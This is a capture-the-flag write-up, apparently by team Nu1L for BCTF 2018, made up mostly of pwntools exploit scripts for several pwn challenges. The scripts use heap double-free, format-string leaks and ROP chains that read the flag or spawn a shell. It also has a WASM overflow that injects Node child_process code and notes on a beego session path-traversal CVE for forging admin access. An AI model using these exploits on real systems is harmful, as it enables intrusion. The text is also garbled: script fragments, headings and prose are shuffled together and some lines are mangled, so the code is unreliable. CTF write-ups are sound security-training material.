BCTF 2018
By Nu1L
BCTF 2018
PWN
easiest
three
hardcore_fmt
SOS
easywasm
Reverse
easypt
Web
checkin
SimpleVN
babySQLiSPA
SEAFARING1
SEAFARING2
Crypto
guess_polynomial
guess_number
BlockChain
EOSGame
Fake3D
MISC
easysandbox
https://bctf.xctf.org.cn/ 1127 14:00 - 1129 02:00
PWN
easiest
Double Freetcache Leak  GOT0x40size
from pwn import *
#p = process('./easiest')
p = remote('39.96.9.148', 9999)
def add(idx, size, c):
    p.recv()
three
    p.sendline('1')
    p.recvuntil('(0-11):')
    p.sendline(str(idx))
    p.recvuntil('Length:')
    p.sendline(str(size))
    p.recvuntil('C:')
    p.sendline(c)
def dele(idx):
    p.recv()
    p.sendline('2')
    p.recvuntil('(0-11):')
    p.sendline(str(idx))
add(0, 0x38, 'aaa')
add(1, 0x38, 'bbb')
dele(0)
dele(1)
dele(0)
add(2, 0x38, p64(0x60203a))
add(3, 0x38, p64(0x60203a))
add(4, 0x38, p64(0x60203a))
add(5, 0x38, '\x40\x00\x00\x00\x00\x00' + p64(0x400946) * 5)
p.interactive()
from pwn import *
def add(cont):
    p.recvuntil('choice')
    p.sendline('1')
    p.recvuntil('content:')
    p.send(cont)
def edit(idx,cont):
    p.recvuntil('choice')
    p.sendline('2')
    p.recvuntil('idx')
    p.sendline(str(idx))
    p.recvuntil('content:')
    p.send(cont)
def dele(idx,cl = 'n'):
    p.recvuntil('choice')
    p.sendline('3')
    p.recvuntil('idx')
    p.sendline(str(idx))
    p.recvuntil('):')
    p.sendline(cl)
while True:
    try:
        p=remote('39.96.13.122', 9999)
        #p=process('./three')#,env={'LD_PRELOAD':'./libc.so.6'})        
        add('\n')
        add('\n')
        add((p64(0xc0)+p64(0x21))*4)
        dele(2,'y')
        dele(1,'y')
        dele(0)
        edit(0,'\x70')
        add('\x70')
        add('\n')
        edit(0,p64(0)+p64(0x91))
        dele(1,'y')
        dele(2)
        dele(2)
        dele(2)
        dele(2)
        dele(2)
        dele(2)
        dele(2)
        edit(0,p64(0)+p64(0x51))
        dele(2)
        edit(0,p64(0)+p64(0x91))
        dele(2,'y')
        x = 0xa8#int(raw_input(),16)#
        edit(0,p64(0)+p64(0x51)+'\xe8'+chr(x))
        add('\xe8'+chr(x))
        #add(p64(0xffffffffff600400))
        add(p64(0))
        dele(1)
        dele(1,'y')
        edit(0,p64(0)+p64(0x51)+'\x78')
        edit(2,p64(0xffffffffff600400))
        add('\x78')
        dele(1,'y')
        add('\xd8'+chr(x))
        dele(0,'y')
        add('\x40')
        dele(0,'y')
        add('\n')
        dele(0,'y')
        add('/bin/sh\x00')
BCTF{U_4r3_Ready_For_House_OF_ATUM}
hardcore_fmt
        a =0xa9#int(raw_input(),16)
        b =0x26#int(raw_input(),16)
        c =0x94# int(raw_input(),16)        
        edit(2,chr(a)+chr(b)+chr(c))
        p.recvuntil('choice')
        p.sendline('3')
        re = p.recvuntil('idx',timeout=0.8)
        if re[-1:] != 'x':
            continue
        p.sendline('0')
        p.sendline('cat flag;bash')
        re = p.recvuntil('(y/n)',timeout = 0.8)
        if re:
            print re
            continue
        p.sendline('echo 123;cat flag') 
        p.interactive()
    except:
        p.close()
        continue
#coding=utf8
from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
context.aslr = False
def pwn(p):
    p.recvuntil('Welcome to hard-core fmt\n')
    p.sendline('%a'*5)
    p.recvuntil('0x0p+00x0.0000000000001p-10220x0.0')
    addr1 = int(p.recvuntil('p-10220x0.0', drop=True) + '00', 16) - 0x100 - 
0x1000
    log.success('addr1: {}'.format(hex(addr1)))
    addr2 = int(p.recvuntil('p-10220x0.0', drop=True) + '00', 16) - 0x1500
    log.success('addr2: {}'.format(hex(addr2)))
    p.sendline(str(addr2 + 0x14c0 + 0x68 + 1))
    p.recvuntil(': ')
    # getsstack_addr
    libc_base = addr1 - 0x619000
    ld_base = addr1 - 0x228000
    log.success('libc_base: {}'.format(hex(libc_base)))
    log.success('ld_base: {}'.format(hex(ld_base)))
    mem_addr = libc_base + 0x3EB0A8 # strlen
    mem_addr = libc_base + 0x3EB140 # memcpy
SOS
    canary = '\x00' + p.recv(7)
    log.success('cnaary: {}'.format(hex(u64(canary))))
    payload = 'a'*0x108 + canary + 'b'*0x8  + p64(mem_addr) + 'c'*0x8 + 
p64(0xffffffffff600000) * 7
    p.sendline(payload)
    # leak program
    p.sendline(str(addr1 + 0x30 + 0x1000))
    p.recvuntil(': ')
    program_base = u64(p.recv(6) + '\x00\x00') - 0x238
    log.success('program_base: {}'.format(hex(program_base)))
    payload = p64(program_base + 0x970) # start
    p.sendline(payload)
    # 
    p.recvuntil('Welcome to hard-core fmt\n')
    p.sendline('hahaha')
    p.recvuntil('hahaha')
    p.sendline(str(addr2))
    p.recvuntil(': ')
    # 0x000000000002155f : pop rdi ; ret
    payload = 'a'*0x108 + canary + 'b'*0x8  + p64(mem_addr) + 'c'*0x8
    payload += p64(libc_base + 0x21560) # 
    payload += p64(libc_base + 0x000000000002155f) + p64(libc_base + 
0x1B3E9A)
    payload += p64(libc_base + 0x4F440)
    #gdb.attach(p)
    p.sendline(payload)
    p.interactive()
if __name__ == '__main__':
    p = process('./hardcore_fmt')
    p = remote('39.106.110.69', 9999)
    pwn(p)
from pwn import *
#p = process('./SOS', env = {'LD_PRELOAD': './libc-2.27.so'})
p = remote('39.96.8.50', 9999)
p.recvuntil('Give me the string size:')
p.sendline('0')
p.recvuntil('Alright, input your SOS code:')
payload = '\x00' * 56
payload += p64(0x400c53)
payload += p64(0x602020)
payload += p64(0x4008E0)
payload += p64(0x400AFC)
#raw_input()
p.send(payload + '\x00' * 8192)
p.recvline()
puts = p.recvline().strip()
puts_addr = u64(puts.ljust(8, '\x00'))
libc_addr = puts_addr - 0x809c0
print hex(puts_addr)
print hex(libc_addr)
system_addr = libc_addr + 0x4f440
binsh_addr = libc_addr + 0x1b3e9a
mov_qword_ptr_rsi_rdi = libc_addr + 0x1401fd
poprsi = libc_addr + 0x23e6a
poprdi = libc_addr + 0x2155f
poprdx = libc_addr + 0x01b96
open_addr = libc_addr + 0x10fc40
read_addr = 0x400900
write_addr = libc_addr + 0x110140
payload = '\x00' * 56
payload += p64(poprdi)
payload += "flag\x00\x00\x00\x00"
payload += p64(poprsi)
payload += p64(0x602080)
payload += p64(mov_qword_ptr_rsi_rdi)
payload += p64(poprdi)
payload += p64(0x602080)
payload += p64(poprsi)
payload += p64(0)
payload += p64(open_addr)
payload += p64(poprdi)
payload += p64(3)
payload += p64(poprsi)
payload += p64(0x602080)
payload += p64(poprdx)
easywasm
The WASM module is used to perform operation with the help of the outside layer. Reversing
the module we could easily found a buﬀer overﬂow caused by strcpy . Since the module
imports __emscripten_run_script , we could overwrite the function pointer (which is actually
a table index) and run some javascript.
payload += p64(100)
payload += p64(read_addr)
payload += p64(poprdi)
payload += p64(1)
payload += p64(poprsi)
payload += p64(0x602080)
payload += p64(write_addr)
#raw_input()
p.recvuntil('Alright, input your SOS code:')
raw_input()
p.send(payload + 'A' * 10000)
#p.shutdown('write')
p.interactive()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import requests, sys, os, urllib, IPython
s = requests.session()
#URL = 'http://localhost:23333/'
URL = 'http://39.96.13.247:9999/'
def add_person(name, is_tutor=0):
    url = URL + 'add_person?'
    url += 'name=' + urllib.quote(name)
    url += '&is_tutor=' + urllib.quote(str(is_tutor))
    print url
    resp = s.get(url)
    if 'person id =' not in resp.content:
        raise Exception("Failed allocation")
    index = int(resp.content[resp.content.index(' = ') + 3:])
    return index
def change_name(idx, name):
    url = URL + 'change_name?'
Reverse
easypt
https://github.com/andikleen/simple-pt/blob/master/fastdecode.c
4007C7call0x52f0
    url += 'id=' + urllib.quote(str(idx))
    url += '&name=' + urllib.quote(name)
    resp = s.get(url)
    print resp.content
    return 'done' in resp.content
def intro(idx):
    url = URL + 'intro?'
    url += 'id=' + urllib.quote(str(idx))
    resp = s.get(url)
    return resp.content
'''
struct person_t {
 i32 idx;
 i32 in_use;
 u8 name[60];
 i32 func_idx;
}
'''
base = 4064
size = 72
idx = add_person('123', 0)
print idx
payload = 'this.a = require("child_process");//'
print len(payload)
assert len(payload)  9999");//'
assert len(payload) <= 60
print change_name(idx, payload)
print intro(idx)
print 'Done!'
Web
checkin
url, 404 :
Powered by beego 1.7.2
gitea/gogsCVE-2018-18925/6, 
go-macaron(https://github.com/go-macaron/session version<0.4.0)
beego(https://github.com/astaxie/beego version<1.11.0)
, sessionprovidersession cookie ./ ,
sessionbug.
0b, session, , 
, (, )
session, , gosessionid
 ../../../../../../go/src/github.com/checkin/website/static/img/avatar/xxxxxxx
.png ,  Admin Panel , ﬂag.
f = open('ttt')
d = f.read()
f.close()
import re
s = r'tnt8 ([N,T]+)'
dd = re.findall(s,d)
res = ''
for i in dd:
    res += i
sss = r'((NT)+)TTT'
de2 = re.findall(sss,res)
de = ''
for i in de2:
    t = len(i[0])/2
    de += chr(t+0x20)
print(de)
# bctf{19c512c582879daf358404a9748cfdbb}!!
UID int
uit int64 # 
username string
package main
import (
SimpleVN
1. pug
 :
    "bytes"
    "encoding/gob"
)
func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
    for _, v := range obj {
        gob.Register(v)
    }
    buf := bytes.NewBuffer(nil)
    err := gob.NewEncoder(buf).Encode(obj)
    return buf.Bytes(), err
}
func DecodeGob(encoded []byte) (map[interface{}]interface{}, error) {
    buf := bytes.NewBuffer(encoded)
    dec := gob.NewDecoder(buf)
    var out map[interface{}]interface{}
    err := dec.Decode(&out)
    if err != nil {
        return nil, err
    }
    return out, nil
}
 #{ }